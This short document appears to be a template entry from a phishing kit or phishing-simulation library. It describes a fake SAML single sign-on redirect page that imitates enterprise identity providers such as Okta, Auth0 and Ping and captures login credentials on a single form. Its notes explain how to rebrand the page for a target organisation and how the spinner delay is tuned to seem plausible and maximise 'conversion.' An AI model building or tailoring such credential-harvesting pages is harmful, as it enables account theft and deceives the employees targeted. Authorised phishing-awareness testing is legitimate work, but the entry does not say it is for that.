name: Generic SAML SSO redirect
description: 'You are being redirected for sign-in' interstitial that resolves to a single-page credential form. Mimics the pattern used by Okta, Auth0, Ping, and most enterprise IdP launchers. Single capture page; no separate 2FA step.
placeholder_notes: Replace [Your Organization] header + the [IdP-Brand] redirect copy with the target's IdP name. Spinner delay (1.2s) is tuned for plausibility — shorter feels suspicious, longer drops conversion.
